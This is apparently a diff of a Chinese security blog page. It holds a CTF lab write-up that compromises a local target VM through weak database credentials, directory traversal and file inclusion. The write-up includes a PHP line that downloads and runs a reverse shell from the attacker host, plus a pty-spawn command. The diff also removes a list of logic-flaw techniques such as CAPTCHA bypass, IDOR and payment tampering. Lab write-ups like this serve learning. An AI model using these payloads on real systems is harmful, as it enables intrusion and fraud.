-host http://192.168.1.16</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;输入<code>dirb http://192.168.1.16</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;扫描结果：<br>&emsp;&emsp;PHP版本为5.3.10，/package.json可能存在敏感信息、/dbadmin/数据库登录等，貌似并没有敏感关键词出现。<br>&emsp;&emsp;打开浏览器访问ip<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;发现是商店网站，大致浏览一遍，发现是展示类网站，除了下图页面存在的文件包含外并无可利用点。<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;深入挖掘<br>&emsp;&emsp;对探测到的信息进行逐个访问<br>&emsp;&emsp;访问ip/package.json<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%877.png" alt=""><br>&emsp;&emsp;得到一些版本信息。<br>&emsp;&emsp;访问ip/dbadmin<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%878.png" alt=""><br>&emsp;&emsp;发现数据库登录页面，尝试弱口令admin<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%879.png" alt=""><br>&emsp;&emsp;成功登录，简单浏览<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8710.png" alt=""><br>&emsp;&emsp;获得敏感信息，账号密码，利用解密工具对密码进行解密<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8711.png" alt=""><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8712.png" alt=""><br>&emsp;&emsp;盲猜zico是用户名，且确认ssh服务开启，尝试远程登录zico<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8713.png" alt=""><br>&emsp;&emsp;权限不足，无法深入<br>&emsp;&emsp;访问<code>ip/cgi-bin</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8714.png" alt=""><br>&emsp;&emsp;没有权限，访问<code>ip/server-status</code>，同样没有权限<br>&emsp;&emsp;此时来看刚刚可能存在的文件包含<code>ip/view?page=tools.html</code><br>&emsp;&emsp;尝试用<code>./</code>以及<code>../</code>目录穿越查看敏感文件<code>/etc/passwd</code><br>&emsp;&emsp;chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8715.png)<br>&emsp;&emsp;成功读取到文件内容，确认存在目录遍历漏洞<br>&emsp;&emsp;尝试读取<code>/etc/shadow</code>文件信息<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8716.png" alt=""><br>&emsp;&emsp;无内容回显，shadow文件可能被设置不可访问或是权限不够。<br>&emsp;&emsp;漏洞利用<br>&emsp;&emsp;读取敏感信息(不做展开)以及文件包含实现getshell<br>&emsp;&emsp;上传一个webshell到服务器，通过此处的目录遍历+文件包含可实现获取反弹shell。<br>&emsp;&emsp;这里尝试利用数据库写入webshell<br>&emsp;&emsp;我们尝试去包含<code>/dbadmin/test_db.php</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8717.png" alt=""><br>&emsp;&emsp;页面成功回显，同时注意到路径<code>/usr/databases/test_users</code><br>&emsp;&emsp;尝试包含此路径<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8718.png" alt=""><br>&emsp;&emsp;获得数据库信息<br>&emsp;&emsp;尝试创建以1.php命名的数据库，内容填充php代码，先尝试使用phpinfo<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8719.png" alt=""><br>&emsp;&emsp;访问1.php<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8720.png" alt=""><br>&emsp;&emsp;成功获取phpinfo信息，接下来尝试获取shell<br>&emsp;&emsp;使用kali自带的webshells中的php反弹shell文件，设置好监听ip以及端口<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8721.png" alt=""><br>&emsp;&emsp;将以上代码复制到数据库字段中<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8722.png" alt=""><br>&emsp;&emsp;代码插入失败<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8723.png" alt=""><br>&emsp;&emsp;开启nc监听，刷新页面，监听无结果。<br>&emsp;&emsp;尝试写入一句话<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8724.png" alt=""><br>&emsp;&emsp;写入成功<br>&emsp;&emsp;中国蚁剑成功连接，打开root目录，显示没有权限<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8725.png" alt=""><br>&emsp;&emsp;这里为常规操作。接下来是提权，这里不多做展开。<br>&emsp;&emsp;回到kali，尝试用kali反弹shell，思路如下：在kali桌面上生成一个反弹shell的代码文件shell.php，然后在桌面上用python建立一个HTTP服务器，在数据库写入到局域网服务器(即python建立的HTTP服务器，如果搭建一个公网服务器，就能够实现攻击)下载并执行文件的代码。当数据库文件被访问时，代码被执行，成功反弹shell。<br>&emsp;&emsp;首先在kali桌面备好代码文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8726.png" alt=""><br>&emsp;&emsp;在桌面建立局域网服务器，端口为8000<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8727.png" alt=""><br>&emsp;&emsp;写入代码<br>&emsp;&emsp;<code>&lt;?php system(&quot;cd /tmp;wget http://192.168.1.15:8000/php-reverse-shell.php;chmod +x php-reverse-shell.php;php php-reverse-shell.php&quot;);?&gt;</code>(之前应该对代码文件重命名)<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8728.png" alt=""><br>&emsp;&emsp;保存并访问<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8729.png" alt=""><br>&emsp;&emsp;成功反弹shell，此时使用<code>python -c “import pty;pty.spawn(‘/bin/bash’)”</code>反弹终端<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8730.png" alt=""><br>&emsp;&emsp;成功反弹，尝试查看sudo权限的命令<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8732.png" alt=""><br>&emsp;&emsp;发现数据库破解的密码都不管用。渗透暂时到此为止。<br><strong>0x04总结</strong><br>&emsp;&emsp;此次渗透，依旧是以信息收集开始，利用文件包含以及数据库可植入payload且可被访问成功反弹shell，然后利用脚本命令反弹终端。<br>&emsp;&emsp;学习到了数据库页面的利用、搭建局域网服务器的新姿势，同时，亦巩固了以信息搜集打头的渗透。<br>&emsp;&emsp;下一篇，再来简单聊聊提权的知识点并获取到靶机上root目录下的FLAG。</p>
+        <p><strong>0x00前言</strong><br>&emsp;&emsp;本篇文章为CTF学习记录系列第四篇，主要内容为通过文件包含结合数据库写入payload实现反弹shell。涉及知识点：工具nmap、dirb、nikto及nc的使用、渗透流程、kali建立局域网服务器等。关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.1.15<br>&emsp;&emsp;靶机(Ubuntu)：192.168.1.16<br><strong>0x02工具</strong><br>&emsp;&emsp;nmap、nikto、dirb、netcat、VMware<br><strong>0x03过程</strong><br>&emsp;&emsp;<strong>信息探测</strong><br>&emsp;&emsp;终端下输入<code>nmap -T4 -A -p- 192.168.1.16</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;探测结果为<br>&emsp;&emsp;&emsp;&emsp;开放端口： 80(http)、22(ssh)、111(rpc)<br>&emsp;&emsp;&emsp;&emsp;Web容器信息：Apache httpd 2.2.22<br>&emsp;&emsp;&emsp;&emsp;系统信息：Ubuntu 1.10<br>&emsp;&emsp;进一步探测敏感信息<br>&emsp;&emsp;使用nc对非http服务的大端口进行探测<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%872.png" alt=""><br>&emsp;&emsp;长时间没有反应，未能得到有效信息<br>&emsp;&emsp;针对开放http服务的80端口<br>&emsp;&emsp;终端下输入<code>nikto -host http://192.168.1.16</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;输入<code>dirb http://192.168.1.16</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;扫描结果：<br>&emsp;&emsp;PHP版本为5.3.10，/package.json可能存在敏感信息、/dbadmin/数据库登录等，貌似并没有敏感关键词出现。<br>&emsp;&emsp;打开浏览器访问ip<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;发现是商店网站，大致浏览一遍，发现是展示类网站，除了下图页面存在的文件包含外并无可利用点。<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;深入挖掘<br>&emsp;&emsp;对探测到的信息进行逐个访问<br>&emsp;&emsp;访问ip/package.json<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%877.png" alt=""><br>&emsp;&emsp;得到一些版本信息。<br>&emsp;&emsp;访问ip/dbadmin<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%878.png" alt=""><br>&emsp;&emsp;发现数据库登录页面，尝试弱口令admin<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%879.png" alt=""><br>&emsp;&emsp;成功登录，简单浏览<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8710.png" alt=""><br>&emsp;&emsp;获得敏感信息，账号密码，利用解密工具对密码进行解密<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8711.png" alt=""><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8712.png" alt=""><br>&emsp;&emsp;盲猜zico是用户名，且确认ssh服务开启，尝试远程登录zico<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8713.png" alt=""><br>&emsp;&emsp;权限不足，无法深入<br>&emsp;&emsp;访问<code>ip/cgi-bin</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8714.png" alt=""><br>&emsp;&emsp;没有权限，访问<code>ip/server-status</code>，同样没有权限<br>&emsp;&emsp;此时来看刚刚可能存在的文件包含<code>ip/view?page=tools.html</code><br>&emsp;&emsp;尝试用<code>./</code>以及<code>../</code>目录穿越查看敏感文件<code>/etc/passwd</code><br>&emsp;&emsp;chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8715.png)<br>&emsp;&emsp;成功读取到文件内容，确认存在目录遍历漏洞<br>&emsp;&emsp;尝试读取<code>/etc/shadow</code>文件信息<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8716.png" alt=""><br>&emsp;&emsp;无内容回显，shadow文件可能被设置不可访问或是权限不够。<br>&emsp;&emsp;漏洞利用<br>&emsp;&emsp;读取敏感信息(不做展开)以及文件包含实现getshell<br>&emsp;&emsp;上传一个webshell到服务器，通过此处的目录遍历+文件包含可实现获取反弹shell。<br>&emsp;&emsp;这里尝试利用数据库写入webshell<br>&emsp;&emsp;我们尝试去包含<code>/dbadmin/test_db.php</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8717.png" alt=""><br>&emsp;&emsp;页面成功回显，同时注意到路径<code>/usr/databases/test_users</code><br>&emsp;&emsp;尝试包含此路径<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8718.png" alt=""><br>&emsp;&emsp;获得数据库信息<br>&emsp;&emsp;尝试创建以1.php命名的数据库，内容填充php代码，先尝试使用phpinfo<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8719.png" alt=""><br>&emsp;&emsp;访问1.php<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8720.png" alt=""><br>&emsp;&emsp;成功获取phpinfo信息，接下来尝试获取shell<br>&emsp;&emsp;使用kali自带的webshells中的php反弹shell文件，设置好监听ip以及端口<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8721.png" alt=""><br>&emsp;&emsp;将以上代码复制到数据库字段中<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8722.png" alt=""><br>&emsp;&emsp;代码插入失败<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8723.png" alt=""><br>&emsp;&emsp;开启nc监听，刷新页面，监听无结果。<br>&emsp;&emsp;尝试写入一句话<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8724.png" alt=""><br>&emsp;&emsp;写入成功<br>&emsp;&emsp;中国蚁剑成功连接，打开root目录，显示没有权限<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8725.png" alt=""><br>&emsp;&emsp;这里为常规操作。接下来是提权，这里不多做展开。<br>&emsp;&emsp;回到kali，尝试用kali反弹shell，思路如下：在kali桌面上生成一个反弹shell的代码文件shell.php，然后在桌面上用python建立一个HTTP服务器，在数据库写入到局域网服务器(即python建立的HTTP服务器，如果搭建一个公网服务器，就能够实现攻击)下载并执行文件的代码。当数据库文件被访问时，代码被执行，成功反弹shell。<br>&emsp;&emsp;首先在kali桌面备好代码文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8726.png" alt=""><br>&emsp;&emsp;在桌面建立局域网服务器，端口为8000<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8727.png" alt=""><br>&emsp;&emsp;写入代码<br>&emsp;&emsp;<code>&lt;?php system(&quot;cd /tmp;wget http://192.168.1.15:8000/php-reverse-shell.php;chmod +x php-reverse-shell.php;php php-reverse-shell.php&quot;);?&gt;</code>(之前应该对代码文件重命名)<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8728.png" alt=""><br>&emsp;&emsp;保存并访问<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8729.png" alt=""><br>&emsp;&emsp;成功反弹shell，此时使用<code>python -c “import pty;pty.spawn(‘/bin/bash’)”</code>反弹终端<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8730.png" alt=""><br>&emsp;&emsp;成功反弹，尝试查看sudo权限的命令<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%9B%BE%E7%89%8732.png" alt=""><br>&emsp;&emsp;发现数据库破解的密码都不管用。渗透暂时到此为止。<br><strong>0x04总结</strong><br>&emsp;&emsp;此次渗透，依旧是以信息收集开始，利用文件包含以及数据库可植入payload且可被访问成功反弹shell，然后利用脚本命令反弹终端。<br>&emsp;&emsp;学习到了数据库页面的利用、搭建局域网服务器的新姿势，同时，亦巩固了以信息搜集打头的渗透。<br>&emsp;&emsp;下一篇，再来简单聊聊提权的知识点并获取到靶机上root目录下的FLAG。</p>
 <p><br><br><br><br><font face="Georgia" color=#c4444>提权之路路漫漫，其修远兮。</font><br>作者：WebDogC</p>
 
       
@@ -905,199 +980,6 @@
 
 
   
-    <article id="post-逻辑漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">常见逻辑漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2020-04-06T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h2><p>&emsp;&emsp;验证码（CAPTCHA）是一种区分用户是计算机还是人的公共全自动程序。可以防止不正当的重复性操作(如恶意破解密码、刷票、论坛灌水等)。</p>
-<h5 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h5><ul>
-<li>前端验证，验证码为前端JS验证，抓包即可绕过。</li>
-<li>不做任何校验，输入任意字符也能验证通过。</li>
-<li>具有时效性(常见)，验证码在一定的时间内都有效。</li>
-<li>去除参数(常见)，抓包去除掉验证码的参数。</li>
-<li>验证码可控，验证为GET/POST传参，可抓包修改。</li>
-<li>具有规律，根据特定规律生成验证码(如时间戳)。</li>
-<li>验证码隐藏在Cookie中。</li>
-</ul>
-<p>————————分割线————————</p>
-<h2 id="密码找回"><a href="#密码找回" class="headerlink" title="密码找回"></a>密码找回</h2><p>&emsp;&emsp;密码找回验证主要是以手机短信验证码及邮箱验证码两种方式。其实质还是验证码，只是验证方式些许不同，依旧主要通过抓包修改进行绕过。</p>
-<h5 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h5><ul>
-<li>后端发送验证码之后在前端返回。<a href="https://www.uedbox.com/post/13890/" target="_blank" rel="noopener">https://www.uedbox.com/post/13890/</a></li>
-<li>验证码验证无次数限制，可爆破出正确验证码。</li>
-<li>验证码可控，验证码参数在HTTP请求头中，且可修改。</li>
-<li>绕过验证码验证页面，直接跳转到修改密码的页面。<a href="https://www.uedbox.com/post/35739/" target="_blank" rel="noopener">https://www.uedbox.com/post/35739/</a></li>
-<li>越权漏洞，站点通过userid参识别用户，可自己接收正确验证码抓包修改userid参数实现修改他人密码。<a href="https://www.uedbox.com/post/42136/" target="_blank" rel="noopener">https://www.uedbox.com/post/42136/</a></li>
-<li>密保问题的答案可能在页面中显示，也可能在JS里，或者是在数据包中。</li>
-</ul>
-<p>————————分割线————————</p>
-<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p><strong>原理</strong><br>&emsp;&emsp;由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以对其他账户的增、删、查、改操作。</p>
-<h5 id="漏洞分类及测试方法"><a href="#漏洞分类及测试方法" class="headerlink" title="漏洞分类及测试方法"></a>漏洞分类及测试方法</h5><ul>
-<li>水平越权：指相同权限下不同的用户可以互相访问，并进行操作。<ul>
-<li>水平越权：主要就是测试能否通过A用户操作影响到B用户，一般做法为抓包分析是否存在类似<code>uid</code>、<code>id</code>、<code>userid</code>等识别用户的参数，对其修改并访问。</li>
-</ul>
-</li>
-<li>垂直越权：指低权限用户越权使用高权限用户的功能。<ul>
-<li>垂直越权：主要就是测试能否通过普通用户操作影响到管理员用户，一般做法是抓包分析是否存在类似<code>admin</code>、<code>level</code>、<code>shenfen</code>等表身份等级的参数，对其修改并访问。</li>
-</ul>
-</li>
-</ul>
-<h5 id="常见越权漏洞方式"><a href="#常见越权漏洞方式" class="headerlink" title="常见越权漏洞方式"></a>常见越权漏洞方式</h5><ol>
-<li>通过修改GET传参来越权<br> 国航某网站可越权访问其他订单<a href="https://www.uedbox.com/post/9900/" target="_blank" rel="noopener">https://www.uedbox.com/post/9900/</a></li>
-<li>修改POST传参进行越权<br> 暴风某站平行越权(用户敏感信息泄露)<a href="https://www.uedbox.com/post/9549/" target="_blank" rel="noopener">https://www.uedbox.com/post/9549/</a></li>
-<li>修改cookie传参进行越权<br> 宜信某平台多处越权及任意用户登录<a href="https://www.uedbox.com/post/12566/" target="_blank" rel="noopener">https://www.uedbox.com/post/12566/</a></li>
-<li>未授权访问<br> 乐视影业临时简历预览系统未授权访问，导致用户敏感信息泄露<a href="https://www.uedbox.com/post/12151/" target="_blank" rel="noopener">https://www.uedbox.com/post/12151/</a></li>
-</ol>
-<p><strong>Tips:</strong><br>1.参数可以在Web端、APP端、应用程序端、Wap端被抓取。<br>2.参数在Web端可以用GET、POST、Cookie三种传参方式,有时还需要解码。</p>
-<p>————————分割线————————</p>
-<h2 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h2><h5 id="在线支付方式"><a href="#在线支付方式" class="headerlink" title="在线支付方式"></a>在线支付方式</h5><p>商户网站确认支付结果有两种方式：</p>
-<ul>
-<li>通过浏览器进行跳转通知<ul>
-<li>基于用户访问的浏览器，用户成功付款，付款页面跳转到支付成功页面，再发送给商户网站支付成功的数据包。如果在付款成功后，未等待跳转到支付结果页面就关闭了支付页面，那么商户网站就收不到支付成功的数据包，导致交易难以处理，而且浏览器端数据很容易被篡改使得安全性无法得到保障。</li>
-</ul>
-</li>
-<li>服务器端异步通知(主流)<ul>
-<li>该方式是用户支付成功后，支付公司服务器后台(如微信、支付宝)会采用POST或GET的方式直接向用户指定的商户异步通知支付成功信息，商户网站接收异部通知信息的过程中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常后则进行交易。</li>
-</ul>
-</li>
-</ul>
-<p><strong>漏洞原理</strong>：开发者对支付过程中需要的逻辑考虑不够严谨，未能考虑到支付各个过程会出现的逻辑错误。</p>
-<h5 id="常见的支付漏洞"><a href="#常见的支付漏洞" class="headerlink" title="常见的支付漏洞"></a>常见的支付漏洞</h5><ul>
-<li>修改支付价格<ul>
-<li>支付三部曲：点击订购、产生订单、进行付款。三个步骤皆可尝试抓包修改金额(如负数)。</li>
-<li>中国国旅任意金额购买机票<a href="https://www.uedbox.com/post/22477/" target="_blank" rel="noopener">https://www.uedbox.com/post/22477/</a></li>
-</ul>
-</li>
-<li>修改支付状态<ul>
-<li>通过修改订单的状态参数(如订单号修改成已支付过的订单号)，实现低价购买高价的目的。</li>
-<li>同程旅交汇低价支付高价订单<a href="https://www.uedbox.com/post/24090/" target="_blank" rel="noopener">https://www.uedbox.com/post/24090/</a></li>
-</ul>
-</li>
-<li>修改订单数量<ul>
-<li>修改数量为特殊值(-1、0)，计算总价时产生逻辑错误。</li>
-<li>同程旅游网支付漏洞<a href="https://www.uedbox.com/post/23143/" target="_blank" rel="noopener">https://www.uedbox.com/post/23143/</a></li>
-</ul>
-</li>
-<li>越权支付<ul>
-<li>用他人的账户买单。当存在userid这类传参时，就可以尝试修改id值测试是否存在越权支付。</li>
-<li>同程艺龙可用他人信用卡代为支付<a href="https://www.uedbox.com/post/12258/" target="_blank" rel="noopener">https://www.uedbox.com/post/12258/</a></li>
-</ul>
-</li>
-<li>无限制试用<ul>
-<li>没有对商品属性进行严格判断，比如抓包修改参数，购买试用或者活动的商品。</li>
-</ul>
-</li>
-<li>积分兑换<ul>
-<li>同支付，皆可尝试抓包修改参数值进行测试。</li>
-<li>东吴人寿商城积分支付漏洞<a href="http://woo.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0156253" target="_blank" rel="noopener">http://woo.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0156253</a></li>
-</ul>
-</li>
-<li>优惠券使用<ul>
-<li>抓包修改优惠券的使用参数，例如数量、金额等</li>
-</ul>
-</li>
-<li>运费<ul>
-<li>抓包修改负值运费，使订单总价降低。</li>
-</ul>
-</li>
-</ul>
-<h5 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h5><ul>
